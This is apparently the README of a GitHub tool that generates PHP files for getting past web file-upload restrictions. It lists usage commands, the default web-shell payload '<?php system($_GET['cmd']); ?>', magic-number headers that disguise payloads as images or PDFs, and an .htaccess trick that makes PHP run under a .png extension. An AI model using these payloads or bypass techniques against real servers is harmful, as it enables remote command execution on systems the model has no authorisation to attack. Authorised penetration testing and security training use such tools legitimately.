# generate-file-upload
Generate some payload to bypass restriction when you perform a file upload

Generate in `Payloads/` all extension for PHP

## Installation & Usage

```
git clone https://github.com/LighTend3r/generate-file-upload.git
cd ./generate-file-upload
```
To install it, write the command above

```
python3 upfile.py -h
```
If you want help to understand the programme

-----

## Exemple of usage :
```
python3 upfile.py
```
Generate all extension in PHP


```
python3 upfile.py -b
```
Generate all bypass for PHP


```
python3 upfile.py -n test -p test -ext php
```
Generate file named `test.php` which contain `test`


```
python3 upfile.py -b -m png
```
Generate all files bypass for PHP, which contain `magicNumber + payload`


```
python3 upfile.py -ext png -ht png
```
Generate `.htaccess` which allow execution of php with extension .png and create `paylaod.png`

-----

## Options

Default name : `payload`

Default file : `PHP`

Default payload : `<?php system($_GET["cmd"]); ?>`

```
usage: upfile.py [-h] [-d] [-p <payload>] [-f {php}] [-ext <ext>] [-b] [-n <name>] [-m {png,jpg,pdf}] [-ht <ext>]

Generate some payload to bypass restriction when you perform a file upload

options:
  -h, --help            show this help message and exit
  -d, --debug           Show debugging to see the process
  -p <payload>, --payload <payload>
                        The payload in the files
  -f {php}, --file {php}
                        The type of the files
  -ext <ext>, --extension <ext>
                        Generate the payload with specific extension
  -b, --bypass          Generate some payload to bypass the restriction
  -n <name>, --name <name>
                        Name of the file
  -m {png,jpg,pdf}, --magic {png,jpg,pdf}
                        Magic Header, add the magics numbers before the payload
  -ht <ext>, --htaccess <ext>
                        Creates in addition a .htaccess file, which allow execution of php whith extension that you
                        have chosen
   ```         
